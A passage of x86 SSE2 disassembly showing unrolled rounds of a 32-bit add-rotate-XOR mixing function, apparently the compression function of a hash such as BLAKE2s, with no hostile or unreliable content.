  4048b2:	66 0f 72 f4 18       	pslld  $0x18,%xmm4
  4048b7:	0f 11 7c 24 40       	movups %xmm7,0x40(%esp)
  4048bc:	66 0f 6e 7c 24 0c    	movd   0xc(%esp),%xmm7
  4048c2:	66 0f ef e0          	pxor   %xmm0,%xmm4
  4048c6:	0f 28 f4             	movaps %xmm4,%xmm6
  4048c9:	66 0f fe f5          	paddd  %xmm5,%xmm6
  4048cd:	0f 28 ce             	movaps %xmm6,%xmm1
  4048d0:	66 0f ef cb          	pxor   %xmm3,%xmm1
  4048d4:	0f 28 c1             	movaps %xmm1,%xmm0
  4048d7:	66 0f 72 d1 07       	psrld  $0x7,%xmm1
  4048dc:	66 0f 72 f0 19       	pslld  $0x19,%xmm0
  4048e1:	66 0f ef c1          	pxor   %xmm1,%xmm0
  4048e5:	66 0f 6e 4c 24 30    	movd   0x30(%esp),%xmm1
  4048eb:	66 0f 70 d8 93       	pshufd $0x93,%xmm0,%xmm3
  4048f0:	66 0f 6e 44 24 18    	movd   0x18(%esp),%xmm0
  4048f6:	66 0f 62 f8          	punpckldq %xmm0,%xmm7
  4048fa:	66 0f 62 ca          	punpckldq %xmm2,%xmm1
  4048fe:	66 0f 62 f9          	punpckldq %xmm1,%xmm7
  404902:	66 0f fe 7c 24 40    	paddd  0x40(%esp),%xmm7
  404908:	66 0f fe fb          	paddd  %xmm3,%xmm7
  40490c:	66 0f 70 c4 39       	pshufd $0x39,%xmm4,%xmm0
  404911:	66 0f ef c7          	pxor   %xmm7,%xmm0
  404915:	0f 28 e0             	movaps %xmm0,%xmm4
  404918:	66 0f 6e 4c 24 2c    	movd   0x2c(%esp),%xmm1
  40491e:	66 0f 72 f0 10       	pslld  $0x10,%xmm0
  404923:	66 0f 70 ee 4e       	pshufd $0x4e,%xmm6,%xmm5
  404928:	66 0f 72 d4 10       	psrld  $0x10,%xmm4
  40492d:	66 0f 6e d6          	movd   %esi,%xmm2
  404931:	66 0f ef e0          	pxor   %xmm0,%xmm4
  404935:	66 0f 62 ca          	punpckldq %xmm2,%xmm1
  404939:	66 0f fe ec          	paddd  %xmm4,%xmm5
  40493d:	66 0f 6e f0          	movd   %eax,%xmm6
  404941:	0f 28 c5             	movaps %xmm5,%xmm0
  404944:	66 0f 6e d1          	movd   %ecx,%xmm2
  404948:	66 0f ef c3          	pxor   %xmm3,%xmm0
  40494c:	0f 28 d8             	movaps %xmm0,%xmm3
  40494f:	66 0f 72 d0 0c       	psrld  $0xc,%xmm0
  404954:	66 0f 72 f3 14       	pslld  $0x14,%xmm3
  404959:	66 0f ef d8          	pxor   %xmm0,%xmm3
  40495d:	66 0f 6e 44 24 24    	movd   0x24(%esp),%xmm0
  404963:	66 0f 62 f0          	punpckldq %xmm0,%xmm6
  404967:	66 0f 62 f1          	punpckldq %xmm1,%xmm6
  40496b:	66 0f fe f7          	paddd  %xmm7,%xmm6
  40496f:	66 0f 6e fa          	movd   %edx,%xmm7
  404973:	66 0f fe f3          	paddd  %xmm3,%xmm6
  404977:	0f 28 c6             	movaps %xmm6,%xmm0
  40497a:	66 0f ef c4          	pxor   %xmm4,%xmm0
  40497e:	0f 28 e0             	movaps %xmm0,%xmm4
  404981:	66 0f 72 d0 08       	psrld  $0x8,%xmm0
  404986:	0f 11 74 24 40       	movups %xmm6,0x40(%esp)
  40498b:	66 0f 72 f4 18       	pslld  $0x18,%xmm4
  404990:	66 0f ef e0          	pxor   %xmm0,%xmm4
  404994:	0f 28 f4             	movaps %xmm4,%xmm6
  404997:	66 0f fe f5          	paddd  %xmm5,%xmm6
  40499b:	0f 28 ce             	movaps %xmm6,%xmm1
  40499e:	66 0f 70 ee 4e       	pshufd $0x4e,%xmm6,%xmm5
  4049a3:	66 0f ef cb          	pxor   %xmm3,%xmm1
  4049a7:	66 0f 6e 74 24 34    	movd   0x34(%esp),%xmm6
  4049ad:	0f 28 c1             	movaps %xmm1,%xmm0
  4049b0:	66 0f 72 d1 07       	psrld  $0x7,%xmm1
  4049b5:	66 0f 72 f0 19       	pslld  $0x19,%xmm0
  4049ba:	66 0f ef c1          	pxor   %xmm1,%xmm0
  4049be:	66 0f 6e 4c 24 28    	movd   0x28(%esp),%xmm1
  4049c4:	66 0f 70 d8 39       	pshufd $0x39,%xmm0,%xmm3
  4049c9:	66 0f 6e 44 24 14    	movd   0x14(%esp),%xmm0
  4049cf:	66 0f 62 f8          	punpckldq %xmm0,%xmm7
  4049d3:	66 0f 62 ca          	punpckldq %xmm2,%xmm1
  4049d7:	66 0f 62 f9          	punpckldq %xmm1,%xmm7
  4049db:	66 0f fe 7c 24 40    	paddd  0x40(%esp),%xmm7
  4049e1:	66 0f 6e 54 24 20    	movd   0x20(%esp),%xmm2
  4049e7:	66 0f fe fb          	paddd  %xmm3,%xmm7
  4049eb:	66 0f 6e 4c 24 1c    	movd   0x1c(%esp),%xmm1
  4049f1:	66 0f 70 c4 93       	pshufd $0x93,%xmm4,%xmm0
  4049f6:	66 0f ef c7          	pxor   %xmm7,%xmm0
  4049fa:	66 0f 62 ca          	punpckldq %xmm2,%xmm1
  4049fe:	0f 28 e0             	movaps %xmm0,%xmm4
  404a01:	66 0f 72 f0 10       	pslld  $0x10,%xmm0
  404a06:	66 0f 72 d4 10       	psrld  $0x10,%xmm4
  404a0b:	66 0f ef e0          	pxor   %xmm0,%xmm4
  404a0f:	66 0f fe ec          	paddd  %xmm4,%xmm5
  404a13:	0f 28 c5             	movaps %xmm5,%xmm0
  404a16:	66 0f ef c3          	pxor   %xmm3,%xmm0
  404a1a:	0f 28 d8             	movaps %xmm0,%xmm3
  404a1d:	66 0f 72 d0 0c       	psrld  $0xc,%xmm0
  404a22:	66 0f 72 f3 14       	pslld  $0x14,%xmm3
  404a27:	66 0f ef d8          	pxor   %xmm0,%xmm3
  404a2b:	66 0f 6e 44 24 10    	movd   0x10(%esp),%xmm0
  404a31:	66 0f 62 f0          	punpckldq %xmm0,%xmm6
  404a35:	66 0f 62 f1          	punpckldq %xmm1,%xmm6
  404a39:	66 0f fe f7          	paddd  %xmm7,%xmm6
  404a3d:	66 0f fe f3          	paddd  %xmm3,%xmm6
  404a41:	0f 28 c6             	movaps %xmm6,%xmm0
  404a44:	66 0f ef c4          	pxor   %xmm4,%xmm0
  404a48:	0f 28 e0             	movaps %xmm0,%xmm4
  404a4b:	66 0f 72 d0 08       	psrld  $0x8,%xmm0
  404a50:	66 0f 72 f4 18       	pslld  $0x18,%xmm4
  404a55:	0f 11 74 24 40       	movups %xmm6,0x40(%esp)
  404a5a:	66 0f ef e0          	pxor   %xmm0,%xmm4
  404a5e:	0f 28 f4             	movaps %xmm4,%xmm6
  404a61:	66 0f fe f5          	paddd  %xmm5,%xmm6
  404a65:	0f 28 ce             	movaps %xmm6,%xmm1
  404a68:	66 0f ef cb          	pxor   %xmm3,%xmm1
  404a6c:	0f 28 c1             	movaps %xmm1,%xmm0
  404a6f:	66 0f 6e 54 24 0c    	movd   0xc(%esp),%xmm2
  404a75:	66 0f 6e 7c 24 14    	movd   0x14(%esp),%xmm7
  404a7b:	66 0f 72 f0 19       	pslld  $0x19,%xmm0
  404a80:	66 0f 72 d1 07       	psrld  $0x7,%xmm1
  404a85:	66 0f 70 ee 4e       	pshufd $0x4e,%xmm6,%xmm5
  404a8a:	66 0f ef c1          	pxor   %xmm1,%xmm0
  404a8e:	66 0f 6e f1          	movd   %ecx,%xmm6
  404a92:	66 0f 6e 4c 24 28    	movd   0x28(%esp),%xmm1
  404a98:	66 0f 70 d8 93       	pshufd $0x93,%xmm0,%xmm3
  404a9d:	66 0f 62 ca          	punpckldq %xmm2,%xmm1
  404aa1:	66 0f 6e 54 24 34    	movd   0x34(%esp),%xmm2
  404aa7:	66 0f 6e c6          	movd   %esi,%xmm0
  404aab:	66 0f 62 f8          	punpckldq %xmm0,%xmm7
  404aaf:	66 0f 62 f9          	punpckldq %xmm1,%xmm7
  404ab3:	66 0f fe 7c 24 40    	paddd  0x40(%esp),%xmm7
  404ab9:	66 0f fe fb          	paddd  %xmm3,%xmm7
  404abd:	66 0f 70 c4 39       	pshufd $0x39,%xmm4,%xmm0
  404ac2:	66 0f ef c7          	pxor   %xmm7,%xmm0
  404ac6:	66 0f 6e 4c 24 10    	movd   0x10(%esp),%xmm1
  404acc:	0f 28 e0             	movaps %xmm0,%xmm4
  404acf:	66 0f 62 ca          	punpckldq %xmm2,%xmm1
  404ad3:	66 0f 72 f0 10       	pslld  $0x10,%xmm0
  404ad8:	66 0f 72 d4 10       	psrld  $0x10,%xmm4
  404add:	66 0f 6e d7          	movd   %edi,%xmm2
  404ae1:	66 0f ef e0          	pxor   %xmm0,%xmm4
  404ae5:	66 0f fe ec          	paddd  %xmm4,%xmm5
  404ae9:	0f 28 c5             	movaps %xmm5,%xmm0
  404aec:	66 0f ef c3          	pxor   %xmm3,%xmm0
  404af0:	0f 28 d8             	movaps %xmm0,%xmm3
  404af3:	66 0f 72 d0 0c       	psrld  $0xc,%xmm0
  404af8:	66 0f 72 f3 14       	pslld  $0x14,%xmm3
  404afd:	66 0f ef d8          	pxor   %xmm0,%xmm3
  404b01:	66 0f 6e 44 24 30    	movd   0x30(%esp),%xmm0
  404b07:	66 0f 62 f0          	punpckldq %xmm0,%xmm6
  404b0b:	66 0f 62 f1          	punpckldq %xmm1,%xmm6
  404b0f:	66 0f fe f7          	paddd  %xmm7,%xmm6
  404b13:	66 0f 6e 7c 24 24    	movd   0x24(%esp),%xmm7
  404b19:	66 0f fe f3          	paddd  %xmm3,%xmm6
  404b1d:	0f 28 c6             	movaps %xmm6,%xmm0
  404b20:	66 0f ef c4          	pxor   %xmm4,%xmm0
  404b24:	0f 28 e0             	movaps %xmm0,%xmm4
  404b27:	66 0f 72 d0 08       	psrld  $0x8,%xmm0
  404b2c:	66 0f 72 f4 18       	pslld  $0x18,%xmm4
  404b31:	0f 11 74 24 40       	movups %xmm6,0x40(%esp)
  404b36:	66 0f ef e0          	pxor   %xmm0,%xmm4
  404b3a:	0f 28 f4             	movaps %xmm4,%xmm6
  404b3d:	66 0f fe f5          	paddd  %xmm5,%xmm6
  404b41:	0f 28 ce             	movaps %xmm6,%xmm1
  404b44:	66 0f 70 ee 4e       	pshufd $0x4e,%xmm6,%xmm5
  404b49:	66 0f ef cb          	pxor   %xmm3,%xmm1
  404b4d:	66 0f 6e 74 24 1c    	movd   0x1c(%esp),%xmm6
  404b53:	0f 28 c1             	movaps %xmm1,%xmm0
  404b56:	66 0f 72 d1 07       	psrld  $0x7,%xmm1
  404b5b:	66 0f 72 f0 19       	pslld  $0x19,%xmm0
  404b60:	66 0f ef c1          	pxor   %xmm1,%xmm0
  404b64:	66 0f 6e 4c 24 18    	movd   0x18(%esp),%xmm1
  404b6a:	66 0f 70 d8 39       	pshufd $0x39,%xmm0,%xmm3
  404b6f:	66 0f 6e 44 24 20    	movd   0x20(%esp),%xmm0
  404b75:	66 0f 62 f8          	punpckldq %xmm0,%xmm7
  404b79:	66 0f 62 ca          	punpckldq %xmm2,%xmm1
  404b7d:	66 0f 62 f9          	punpckldq %xmm1,%xmm7
  404b81:	66 0f fe 7c 24 40    	paddd  0x40(%esp),%xmm7
  404b87:	66 0f fe fb          	paddd  %xmm3,%xmm7
  404b8b:	66 0f 70 c4 93       	pshufd $0x93,%xmm4,%xmm0
  404b90:	66 0f ef c7          	pxor   %xmm7,%xmm0
  404b94:	66 0f 6e d0          	movd   %eax,%xmm2
  404b98:	0f 28 e0             	movaps %xmm0,%xmm4
  404b9b:	66 0f 6e ca          	movd   %edx,%xmm1
  404b9f:	66 0f 72 f0 10       	pslld  $0x10,%xmm0
  404ba4:	66 0f 72 d4 10       	psrld  $0x10,%xmm4
  404ba9:	66 0f 62 ca          	punpckldq %xmm2,%xmm1
  404bad:	66 0f ef e0          	pxor   %xmm0,%xmm4
  404bb1:	66 0f fe ec          	paddd  %xmm4,%xmm5
  404bb5:	0f 28 c5             	movaps %xmm5,%xmm0
  404bb8:	66 0f ef c3          	pxor   %xmm3,%xmm0
  404bbc:	0f 28 d8             	movaps %xmm0,%xmm3
  404bbf:	66 0f 72 d0 0c       	psrld  $0xc,%xmm0
  404bc4:	66 0f 72 f3 14       	pslld  $0x14,%xmm3
  404bc9:	66 0f ef d8          	pxor   %xmm0,%xmm3
  404bcd:	66 0f 6e 44 24 2c    	movd   0x2c(%esp),%xmm0
  404bd3:	66 0f 62 f0          	punpckldq %xmm0,%xmm6
  404bd7:	66 0f 62 f1          	punpckldq %xmm1,%xmm6
  404bdb:	66 0f fe f7          	paddd  %xmm7,%xmm6
  404bdf:	66 0f 6e d2          	movd   %edx,%xmm2
  404be3:	66 0f fe f3          	paddd  %xmm3,%xmm6
  404be7:	66 0f 6e f9          	movd   %ecx,%xmm7
  404beb:	0f 28 c6             	movaps %xmm6,%xmm0
  404bee:	66 0f ef c4          	pxor   %xmm4,%xmm0
  404bf2:	0f 28 e0             	movaps %xmm0,%xmm4
  404bf5:	66 0f 72 d0 08       	psrld  $0x8,%xmm0
  404bfa:	66 0f 72 f4 18       	pslld  $0x18,%xmm4
  404bff:	0f 11 74 24 40       	movups %xmm6,0x40(%esp)
  404c04:	66 0f ef e0          	pxor   %xmm0,%xmm4
  404c08:	0f 28 f4             	movaps %xmm4,%xmm6
  404c0b:	66 0f fe f5          	paddd  %xmm5,%xmm6
  404c0f:	0f 28 ce             	movaps %xmm6,%xmm1
  404c12:	66 0f 70 ee 4e       	pshufd $0x4e,%xmm6,%xmm5
  404c17:	66 0f ef cb          	pxor   %xmm3,%xmm1
  404c1b:	66 0f 6e 74 24 2c    	movd   0x2c(%esp),%xmm6
  404c21:	0f 28 c1             	movaps %xmm1,%xmm0
  404c24:	66 0f 72 d1 07       	psrld  $0x7,%xmm1
  404c29:	66 0f 72 f0 19       	pslld  $0x19,%xmm0
  404c2e:	66 0f ef c1          	pxor   %xmm1,%xmm0
  404c32:	66 0f 6e 4c 24 18    	movd   0x18(%esp),%xmm1
  404c38:	66 0f 70 d8 93       	pshufd $0x93,%xmm0,%xmm3
  404c3d:	66 0f 6e 44 24 24    	movd   0x24(%esp),%xmm0
  404c43:	66 0f 62 f8          	punpckldq %xmm0,%xmm7
  404c47:	66 0f 62 ca          	punpckldq %xmm2,%xmm1
  404c4b:	66 0f 62 f9          	punpckldq %xmm1,%xmm7
  404c4f:	66 0f fe 7c 24 40    	paddd  0x40(%esp),%xmm7
  404c55:	66 0f fe fb          	paddd  %xmm3,%xmm7
  404c59:	66 0f 6e 4c 24 14    	movd   0x14(%esp),%xmm1
  404c5f:	66 0f 70 c4 39       	pshufd $0x39,%xmm4,%xmm0
  404c64:	66 0f ef c7          	pxor   %xmm7,%xmm0
  404c68:	66 0f 6e d7          	movd   %edi,%xmm2
  404c6c:	0f 28 e0             	movaps %xmm0,%xmm4
  404c6f:	66 0f 62 ca          	punpckldq %xmm2,%xmm1
  404c73:	66 0f 72 f0 10       	pslld  $0x10,%xmm0
  404c78:	66 0f 72 d4 10       	psrld  $0x10,%xmm4
  404c7d:	66 0f 6e 54 24 28    	movd   0x28(%esp),%xmm2
  404c83:	66 0f ef e0          	pxor   %xmm0,%xmm4
  404c87:	66 0f fe ec          	paddd  %xmm4,%xmm5
  404c8b:	0f 28 c5             	movaps %xmm5,%xmm0
  404c8e:	66 0f ef c3          	pxor   %xmm3,%xmm0
  404c92:	0f 28 d8             	movaps %xmm0,%xmm3
  404c95:	66 0f 72 d0 0c       	psrld  $0xc,%xmm0
  404c9a:	66 0f 72 f3 14       	pslld  $0x14,%xmm3
  404c9f:	66 0f ef d8          	pxor   %xmm0,%xmm3
  404ca3:	66 0f 6e 44 24 20    	movd   0x20(%esp),%xmm0
  404ca9:	66 0f 62 f0          	punpckldq %xmm0,%xmm6
  404cad:	66 0f 62 f1          	punpckldq %xmm1,%xmm6
  404cb1:	66 0f fe f7          	paddd  %xmm7,%xmm6
  404cb5:	66 0f 6e 7c 24 34    	movd   0x34(%esp),%xmm7
  404cbb:	66 0f fe f3          	paddd  %xmm3,%xmm6
  404cbf:	0f 28 c6             	movaps %xmm6,%xmm0
  404cc2:	66 0f ef c4          	pxor   %xmm4,%xmm0
  404cc6:	0f 28 e0             	movaps %xmm0,%xmm4
  404cc9:	66 0f 72 d0 08       	psrld  $0x8,%xmm0
  404cce:	66 0f 72 f4 18       	pslld  $0x18,%xmm4
  404cd3:	0f 11 74 24 40       	movups %xmm6,0x40(%esp)
  404cd8:	66 0f ef e0          	pxor   %xmm0,%xmm4
  404cdc:	0f 28 f4             	movaps %xmm4,%xmm6
  404cdf:	66 0f fe f5          	paddd  %xmm5,%xmm6
  404ce3:	0f 28 ce             	movaps %xmm6,%xmm1
  404ce6:	66 0f ef cb          	pxor   %xmm3,%xmm1
  404cea:	0f 28 c1             	movaps %xmm1,%xmm0
  404ced:	66 0f 72 d1 07       	psrld  $0x7,%xmm1
  404cf2:	66 0f 72 f0 19       	pslld  $0x19,%xmm0
  404cf7:	66 0f ef c1          	pxor   %xmm1,%xmm0
  404cfb:	66 0f 6e 4c 24 0c    	movd   0xc(%esp),%xmm1
  404d01:	66 0f 70 d8 39       	pshufd $0x39,%xmm0,%xmm3
  404d06:	66 0f 6e 44 24 1c    	movd   0x1c(%esp),%xmm0
  404d0c:	66 0f 62 f8          	punpckldq %xmm0,%xmm7
  404d10:	66 0f 62 ca          	punpckldq %xmm2,%xmm1
  404d14:	66 0f 62 f9          	punpckldq %xmm1,%xmm7
  404d18:	66 0f fe 7c 24 40    	paddd  0x40(%esp),%xmm7
  404d1e:	66 0f 70 c4 93       	pshufd $0x93,%xmm4,%xmm0
  404d23:	66 0f fe fb          	paddd  %xmm3,%xmm7
  404d27:	66 0f ef c7          	pxor   %xmm7,%xmm0
  404d2b:	0f 28 e0             	movaps %xmm0,%xmm4
  404d2e:	66 0f 72 f0 10       	pslld  $0x10,%xmm0
  404d33:	66 0f 72 d4 10       	psrld  $0x10,%xmm4
  404d38:	66 0f ef e0          	pxor   %xmm0,%xmm4
  404d3c:	66 0f 6e 4c 24 30    	movd   0x30(%esp),%xmm1
  404d42:	66 0f 70 ee 4e       	pshufd $0x4e,%xmm6,%xmm5
  404d47:	66 0f 6e 74 24 10    	movd   0x10(%esp),%xmm6
  404d4d:	66 0f fe ec          	paddd  %xmm4,%xmm5
  404d51:	0f 28 c5             	movaps %xmm5,%xmm0
  404d54:	66 0f 6e d6          	movd   %esi,%xmm2
  404d58:	66 0f ef c3          	pxor   %xmm3,%xmm0
  404d5c:	66 0f 62 ca          	punpckldq %xmm2,%xmm1
  404d60:	0f 28 d8             	movaps %xmm0,%xmm3
  404d63:	66 0f 6e d0          	movd   %eax,%xmm2
  404d67:	66 0f 72 d0 0c       	psrld  $0xc,%xmm0
  404d6c:	66 0f 72 f3 14       	pslld  $0x14,%xmm3
  404d71:	66 0f ef d8          	pxor   %xmm0,%xmm3
  404d75:	66 0f 6e c0          	movd   %eax,%xmm0
  404d79:	66 0f 62 f0          	punpckldq %xmm0,%xmm6
  404d7d:	66 0f 62 f1          	punpckldq %xmm1,%xmm6
  404d81:	66 0f fe f7          	paddd  %xmm7,%xmm6
  404d85:	66 0f 6e 7c 24 24    	movd   0x24(%esp),%xmm7
  404d8b:	66 0f fe f3          	paddd  %xmm3,%xmm6
  404d8f:	0f 28 c6             	movaps %xmm6,%xmm0
  404d92:	66 0f ef c4          	pxor   %xmm4,%xmm0
  404d96:	0f 28 e0             	movaps %xmm0,%xmm4
  404d99:	66 0f 72 d0 08       	psrld  $0x8,%xmm0
  404d9e:	0f 11 74 24 40       	movups %xmm6,0x40(%esp)
  404da3:	66 0f 72 f4 18       	pslld  $0x18,%xmm4
  404da8:	66 0f ef e0          	pxor   %xmm0,%xmm4
  404dac:	0f 28 f4             	movaps %xmm4,%xmm6
  404daf:	66 0f fe f5          	paddd  %xmm5,%xmm6
  404db3:	0f 28 ce             	movaps %xmm6,%xmm1
  404db6:	66 0f 70 ee 4e       	pshufd $0x4e,%xmm6,%xmm5
  404dbb:	66 0f ef cb          	pxor   %xmm3,%xmm1
  404dbf:	66 0f 6e 74 24 30    	movd   0x30(%esp),%xmm6
  404dc5:	0f 28 c1             	movaps %xmm1,%xmm0
  404dc8:	66 0f 72 d1 07       	psrld  $0x7,%xmm1
  404dcd:	66 0f 72 f0 19       	pslld  $0x19,%xmm0
  404dd2:	66 0f ef c1          	pxor   %xmm1,%xmm0
  404dd6:	66 0f 6e 4c 24 1c    	movd   0x1c(%esp),%xmm1
  404ddc:	66 0f 70 d8 93       	pshufd $0x93,%xmm0,%xmm3
  404de1:	66 0f 6e 44 24 2c    	movd   0x2c(%esp),%xmm0
  404de7:	66 0f 62 f8          	punpckldq %xmm0,%xmm7
  404deb:	66 0f 62 ca          	punpckldq %xmm2,%xmm1
  404def:	66 0f 62 f9          	punpckldq %xmm1,%xmm7
  404df3:	66 0f fe 7c 24 40    	paddd  0x40(%esp),%xmm7
  404df9:	66 0f 6e 54 24 28    	movd   0x28(%esp),%xmm2
  404dff:	66 0f fe fb          	paddd  %xmm3,%xmm7
  404e03:	66 0f 70 c4 39       	pshufd $0x39,%xmm4,%xmm0
  404e08:	66 0f ef c7          	pxor   %xmm7,%xmm0
  404e0c:	66 0f 6e ca          	movd   %edx,%xmm1
  404e10:	0f 28 e0             	movaps %xmm0,%xmm4
  404e13:	66 0f 62 ca          	punpckldq %xmm2,%xmm1
  404e17:	66 0f 72 f0 10       	pslld  $0x10,%xmm0
  404e1c:	66 0f 72 d4 10       	psrld  $0x10,%xmm4
  404e21:	66 0f ef e0          	pxor   %xmm0,%xmm4
  404e25:	66 0f fe ec          	paddd  %xmm4,%xmm5
  404e29:	0f 28 c5             	movaps %xmm5,%xmm0
  404e2c:	66 0f ef c3          	pxor   %xmm3,%xmm0
  404e30:	0f 28 d8             	movaps %xmm0,%xmm3
  404e33:	66 0f 72 d0 0c       	psrld  $0xc,%xmm0
  404e38:	66 0f 72 f3 14       	pslld  $0x14,%xmm3
  404e3d:	66 0f ef d8          	pxor   %xmm0,%xmm3
  404e41:	66 0f 6e 44 24 0c    	movd   0xc(%esp),%xmm0
  404e47:	66 0f 62 f0          	punpckldq %xmm0,%xmm6
  404e4b:	66 0f 62 f1          	punpckldq %xmm1,%xmm6
  404e4f:	66 0f fe f7          	paddd  %xmm7,%xmm6
  404e53:	66 0f fe f3          	paddd  %xmm3,%xmm6
  404e57:	0f 28 c6             	movaps %xmm6,%xmm0
  404e5a:	66 0f ef c4          	pxor   %xmm4,%xmm0
  404e5e:	0f 28 e0             	movaps %xmm0,%xmm4
  404e61:	66 0f 72 d0 08       	psrld  $0x8,%xmm0
  404e66:	66 0f 72 f4 18       	pslld  $0x18,%xmm4
  404e6b:	0f 11 74 24 40       	movups %xmm6,0x40(%esp)
  404e70:	66 0f ef e0          	pxor   %xmm0,%xmm4
  404e74:	0f 28 f4             	movaps %xmm4,%xmm6
  404e77:	66 0f fe f5          	paddd  %xmm5,%xmm6
  404e7b:	0f 28 ce             	movaps %xmm6,%xmm1
  404e7e:	66 0f ef cb          	pxor   %xmm3,%xmm1
  404e82:	0f 28 c1             	movaps %xmm1,%xmm0
  404e85:	66 0f 72 d1 07       	psrld  $0x7,%xmm1
  404e8a:	66 0f 72 f0 19       	pslld  $0x19,%xmm0
  404e8f:	66 0f ef c1          	pxor   %xmm1,%xmm0
  404e93:	66 0f 6e 54 24 10    	movd   0x10(%esp),%xmm2
  404e99:	66 0f 6e 4c 24 14    	movd   0x14(%esp),%xmm1
  404e9f:	66 0f 6e 7c 24 20    	movd   0x20(%esp),%xmm7
  404ea5:	66 0f 70 d8 39       	pshufd $0x39,%xmm0,%xmm3
  404eaa:	66 0f 62 ca          	punpckldq %xmm2,%xmm1
  404eae:	66 0f 6e c7          	movd   %edi,%xmm0
  404eb2:	66 0f 62 f8          	punpckldq %xmm0,%xmm7
  404eb6:	66 0f 62 f9          	punpckldq %xmm1,%xmm7
  404eba:	66 0f fe 7c 24 40    	paddd  0x40(%esp),%xmm7
  404ec0:	66 0f fe fb          	paddd  %xmm3,%xmm7
  404ec4:	66 0f 70 c4 93       	pshufd $0x93,%xmm4,%xmm0
  404ec9:	66 0f ef c7          	pxor   %xmm7,%xmm0
  404ecd:	66 0f 6e 4c 24 18    	movd   0x18(%esp),%xmm1
  404ed3:	0f 28 e0             	movaps %xmm0,%xmm4
  404ed6:	66 0f 70 ee 4e       	pshufd $0x4e,%xmm6,%xmm5
  404edb:	66 0f 72 f0 10       	pslld  $0x10,%xmm0
  404ee0:	66 0f 72 d4 10       	psrld  $0x10,%xmm4
  404ee5:	66 0f 6e d1          	movd   %ecx,%xmm2
  404ee9:	66 0f ef e0          	pxor   %xmm0,%xmm4
  404eed:	66 0f 62 ca          	punpckldq %xmm2,%xmm1
  404ef1:	66 0f fe ec          	paddd  %xmm4,%xmm5
  404ef5:	66 0f 6e f6          	movd   %esi,%xmm6
  404ef9:	0f 28 c5             	movaps %xmm5,%xmm0
  404efc:	66 0f 6e 54 24 20    	movd   0x20(%esp),%xmm2
  404f02:	66 0f ef c3          	pxor   %xmm3,%xmm0
  404f06:	0f 28 d8             	movaps %xmm0,%xmm3
  404f09:	66 0f 72 d0 0c       	psrld  $0xc,%xmm0
  404f0e:	66 0f 72 f3 14       	pslld  $0x14,%xmm3
  404f13:	66 0f ef d8          	pxor   %xmm0,%xmm3
  404f17:	66 0f 6e 44 24 34    	movd   0x34(%esp),%xmm0
  404f1d:	66 0f 62 f0          	punpckldq %xmm0,%xmm6
  404f21:	66 0f 62 f1          	punpckldq %xmm1,%xmm6
  404f25:	66 0f fe f7          	paddd  %xmm7,%xmm6
  404f29:	66 0f 6e 7c 24 30    	movd   0x30(%esp),%xmm7
  404f2f:	66 0f fe f3          	paddd  %xmm3,%xmm6
  404f33:	0f 28 c6             	movaps %xmm6,%xmm0
  404f36:	66 0f ef c4          	pxor   %xmm4,%xmm0
  404f3a:	0f 28 e0             	movaps %xmm0,%xmm4
  404f3d:	66 0f 72 d0 08       	psrld  $0x8,%xmm0
  404f42:	0f 11 74 24 40       	movups %xmm6,0x40(%esp)
  404f47:	66 0f 72 f4 18       	pslld  $0x18,%xmm4
  404f4c:	66 0f ef e0          	pxor   %xmm0,%xmm4
  404f50:	0f 28 f4             	movaps %xmm4,%xmm6
  404f53:	66 0f fe f5          	paddd  %xmm5,%xmm6
  404f57:	0f 28 ce             	movaps %xmm6,%xmm1
  404f5a:	66 0f 70 ee 4e       	pshufd $0x4e,%xmm6,%xmm5
  404f5f:	66 0f ef cb          	pxor   %xmm3,%xmm1
  404f63:	66 0f 6e 74 24 18    	movd   0x18(%esp),%xmm6
  404f69:	0f 28 c1             	movaps %xmm1,%xmm0
  404f6c:	66 0f 72 d1 07       	psrld  $0x7,%xmm1
  404f71:	66 0f 72 f0 19       	pslld  $0x19,%xmm0
  404f76:	66 0f ef c1          	pxor   %xmm1,%xmm0
  404f7a:	66 0f 6e 4c 24 10    	movd   0x10(%esp),%xmm1
  404f80:	66 0f 70 d8 93       	pshufd $0x93,%xmm0,%xmm3
  404f85:	66 0f 6e 44 24 34    	movd   0x34(%esp),%xmm0
  404f8b:	66 0f 62 f8          	punpckldq %xmm0,%xmm7
  404f8f:	66 0f 62 ca          	punpckldq %xmm2,%xmm1
  404f93:	66 0f 62 f9          	punpckldq %xmm1,%xmm7
  404f97:	66 0f fe 7c 24 40    	paddd  0x40(%esp),%xmm7
  404f9d:	66 0f fe fb          	paddd  %xmm3,%xmm7
  404fa1:	66 0f 70 c4 39       	pshufd $0x39,%xmm4,%xmm0
  404fa6:	66 0f ef c7          	pxor   %xmm7,%xmm0
  404faa:	66 0f 6e d2          	movd   %edx,%xmm2
  404fae:	0f 28 e0             	movaps %xmm0,%xmm4
  404fb1:	66 0f 6e cf          	movd   %edi,%xmm1
  404fb5:	66 0f 72 f0 10       	pslld  $0x10,%xmm0
  404fba:	66 0f 72 d4 10       	psrld  $0x10,%xmm4
  404fbf:	66 0f 62 ca          	punpckldq %xmm2,%xmm1
  404fc3:	66 0f ef e0          	pxor   %xmm0,%xmm4
  404fc7:	66 0f fe ec          	paddd  %xmm4,%xmm5
  404fcb:	0f 28 c5             	movaps %xmm5,%xmm0
  404fce:	66 0f ef c3          	pxor   %xmm3,%xmm0
  404fd2:	0f 28 d8             	movaps %xmm0,%xmm3
  404fd5:	66 0f 72 d0 0c       	psrld  $0xc,%xmm0
  404fda:	66 0f 72 f3 14       	pslld  $0x14,%xmm3
  404fdf:	66 0f ef d8          	pxor   %xmm0,%xmm3
  404fe3:	66 0f 6e c6          	movd   %esi,%xmm0
  404fe7:	66 0f 62 f0          	punpckldq %xmm0,%xmm6
  404feb:	66 0f 62 f1          	punpckldq %xmm1,%xmm6
  404fef:	66 0f fe f7          	paddd  %xmm7,%xmm6
  404ff3:	66 0f fe f3          	paddd  %xmm3,%xmm6
  404ff7:	0f 28 c6             	movaps %xmm6,%xmm0
  404ffa:	66 0f 6e 7c 24 2c    	movd   0x2c(%esp),%xmm7
  405000:	66 0f ef c4          	pxor   %xmm4,%xmm0
  405004:	66 0f 6e d0          	movd   %eax,%xmm2
  405008:	0f 28 e0             	movaps %xmm0,%xmm4
  40500b:	66 0f 72 d0 08       	psrld  $0x8,%xmm0
  405010:	66 0f 72 f4 18       	pslld  $0x18,%xmm4
  405015:	0f 11 74 24 40       	movups %xmm6,0x40(%esp)
  40501a:	66 0f ef e0          	pxor   %xmm0,%xmm4
  40501e:	0f 28 f4             	movaps %xmm4,%xmm6
  405021:	66 0f fe f5          	paddd  %xmm5,%xmm6
  405025:	0f 28 ce             	movaps %xmm6,%xmm1
